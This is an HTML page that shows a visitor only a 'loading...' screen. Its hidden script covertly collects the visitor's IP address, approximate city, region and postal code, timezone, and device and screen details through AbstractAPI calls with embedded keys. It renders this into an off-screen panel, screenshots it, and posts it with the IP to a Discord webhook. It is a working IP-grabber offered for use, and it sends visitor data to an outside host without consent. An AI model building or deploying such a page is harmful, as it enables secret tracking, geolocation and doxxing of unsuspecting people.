<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading…</title>
<style>
html,body{height:100%;margin:0}
body{
  background:#000;color:#fff;
  font-family:Inter,system-ui,Arial,sans-serif;
  display:flex;align-items:center;justify-content:center;flex-direction:column
}
.big{font-size:36px;letter-spacing:1px}
.sub{font-size:12px;margin-top:12px;opacity:.6}
#capture-root{
  position:absolute;left:-9999px;top:-9999px;
  width:760px;padding:20px;background:#0b0b0b;border-radius:8px
}
.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
.card{background:#080808;padding:10px;border-radius:8px}
.card strong{display:block;font-size:15px}
.label{font-size:11px;color:#999;margin-top:6px}
#statusHidden{font-size:11px;color:#aaa;margin-top:10px}
</style>
</head>
<body>
<div class="big">loading...</div>
<div class="sub">this usually takes 1–20 seconds</div>

<div id="capture-root" aria-hidden="true">
  <h2>Device & Network Snapshot</h2>
  <div class="grid">
    <div class="card"><strong id="ip">Loading...</strong><div class="label">IP Address</div></div>
    <div class="card"><strong id="country">Loading...</strong><div class="label">Country</div></div>
    <div class="card"><strong id="avgAddress">Loading...</strong><div class="label">Approx Location</div></div>
    <div class="card"><strong id="timezone">Loading...</strong><div class="label">Timezone</div></div>
    <div class="card"><strong id="vpn">Checking…</strong><div class="label">VPN / Proxy</div></div>
    <div class="card"><strong id="bot">Checking…</strong><div class="label">Bot Detected</div></div>
    <div class="card"><strong id="device">Loading…</strong><div class="label">Device / OS</div></div>
    <div class="card"><strong id="screenInfo">Loading…</strong><div class="label">Screen</div></div>
  </div>
  <div id="statusHidden">Preparing…</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<script>
const el=id=>document.getElementById(id);
const safe=v=>(v===undefined||v===null||v==="")?"N/A":v;

function botScore(){
  let s=0;
  if(/bot|crawl|spider|headless|puppeteer|selenium/i.test(navigator.userAgent)) s+=2;
  if(navigator.webdriver) s+=2;
  if(!navigator.plugins?.length) s+=1;
  return s;
}

async function run(){
  try{
    el("statusHidden").textContent="Fetching IP info…";
    const geoAPIKey="8773c41586084029934439d77d94c403"; // AbstractAPI IP intelligence
    const tzAPIKey="43edbb7ddc624acbb095a358611d1e86";  // AbstractAPI timezone

    // Get IP info
    const ipResp=await fetch(`https://ip-intelligence.abstractapi.com/v1/?api_key=${geoAPIKey}`);
    const geo=await ipResp.json();
    el("ip").textContent=safe(geo.ip_address);
    el("country").textContent=safe(geo.country);
    el("avgAddress").textContent=`${safe(geo.city)}, ${safe(geo.region)}${geo.postal_code?", "+geo.postal_code:""}`;

    // Timezone
    const tzResp=await fetch(`https://timezone.abstractapi.com/v1/current_time/?api_key=${tzAPIKey}&location=${encodeURIComponent(geo.city||geo.ip_address)}`);
    const tz=await tzResp.json();
    el("timezone").textContent=safe(tz.timezone_location || tz.abbreviation);

    // VPN / Proxy heuristic (AbstractAPI free tier cannot reliably detect VPN)
    el("vpn").textContent="N/A"; // mark unknown

    // Bot detection
    el("bot").textContent=botScore()>=3?"Yes (Likely)":"No";

    // Device info
    el("device").textContent=`${navigator.platform} · ${navigator.hardwareConcurrency||"?"} cores · ${navigator.deviceMemory||"?"}GB`;
    el("screenInfo").textContent=`${screen.width}×${screen.height}`;

    // Capture screenshot
    el("statusHidden").textContent="Capturing screenshot…";
    await new Promise(r=>setTimeout(r,400));
    const canvas=await html2canvas(el("capture-root"),{scale:1.2});
    const blob=await (await fetch(canvas.toDataURL())).blob();

    // Send to webhook
    const form=new FormData();
    form.append("file",blob,"snapshot.png");
    form.append("content",
      `Snapshot | IP: ${el("ip").textContent} | Bot: ${el("bot").textContent} | ${new Date().toLocaleString()}`
    );

    el("statusHidden").textContent="Sending to webhook…";
    await fetch("YOUR_DISCORD_WEBHOOK_URL_HERE",{method:"POST",body:form});

    el("statusHidden").textContent="Sent";
  }catch(e){
    console.error(e);
    el("statusHidden").textContent="Error (see console)";
  }
}

setTimeout(run,300);
</script>
</body>
</html>
